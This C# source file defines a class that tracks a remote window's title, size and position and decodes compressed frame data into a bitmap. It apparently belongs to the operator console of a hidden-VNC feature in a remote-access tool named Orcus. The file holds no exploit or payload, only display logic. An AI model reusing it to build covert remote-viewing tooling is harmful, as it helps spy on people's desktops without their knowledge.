﻿#if DEBUG
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Media.Imaging;
using Orcus.Shared.Commands.HVNC;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Administration.Commands.HVNC
{
    public class WindowRenderInfo : INotifyPropertyChanged, IDisposable
    {
        private UnsafeStreamCodec _unsafeStreamCodec;
        public readonly object RenderLock = new object();
        private int _currentWidth;
        private int _currentHeight;

        private string _title;
        private int _width;
        private int _height;
        private int _x;
        private int _y;

        public WindowRenderInfo(WindowInformation windowInformation)
        {
            UpdateData(windowInformation);
            Handle = windowInformation.Handle;
        }

        public void Dispose()
        {
            _unsafeStreamCodec?.Dispose();
            Image = null;
        }

        public WriteableBitmap Image { get; private set; }
        public DateTime LastUpdate { get; private set; }
        public Int64 Handle { get; }

        public string Title
        {
            get { return _title; }
            set
            {
                if (_title != value)
                {
                    _title = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Height
        {
            get { return _height; }
            set
            {
                if (_height != value)
                {
                    _height = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Width
        {
            get { return _width; }
            set
            {
                if (_width != value)
                {
                    _width = value;
                    OnPropertyChanged();
                }
            }
        }

        public int X
        {
            get { return _x; }
            set
            {
                if (_x != value)
                {
                    _x = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Y
        {
            get { return _y; }
            set
            {
                if (_y != value)
                {
                    _y = value;
                    OnPropertyChanged();
                }
            }
        }

        public void UpdateData(WindowInformation windowInformation)
        {
            X = windowInformation.X;
            Y = windowInformation.Y;
            Height = windowInformation.Height;
            Width = windowInformation.Width;
            Title = windowInformation.Title;
        }

        public unsafe void UpdateImage(byte[] data)
        {
            int width = BitConverter.ToInt32(data, 0);
            int height = BitConverter.ToInt32(data, 4);

            lock (RenderLock)
            {
                if (_unsafeStreamCodec == null || _currentHeight != height || _currentWidth != width)
                {
                    _unsafeStreamCodec?.Dispose();
                    _currentWidth = width;
                    _currentHeight = height;
                    _unsafeStreamCodec = new UnsafeStreamCodec(UnsafeStreamCodecParameters.None);
                }
                fixed (byte* dataPtr = data)
                {
                    Image = _unsafeStreamCodec.DecodeData(dataPtr, (uint)data.Length, Application.Current.Dispatcher);
                }
                //    Image = BitmapFromWriteableBitmap(_unsafeStreamCodec.DecodeData(dataPtr, (uint)data.Length +5, Application.Current.Dispatcher));

                /*using (var memoryStream = new MemoryStream(data, 8, data.Length - 8))
                {
                    fixed (byte* dataPtr = memoryStream.ToArray())
                    {
                        Image = BitmapFromWriteableBitmap(_unsafeStreamCodec.DecodeData(dataPtr, (uint)memoryStream.Length, dp));
                    }
                }*/
                //Image = _unsafeStreamCodec.DecodeData(memoryStream);
                LastUpdate = DateTime.Now;
            }
        }

        public event PropertyChangedEventHandler PropertyChanged;

        protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}
#endif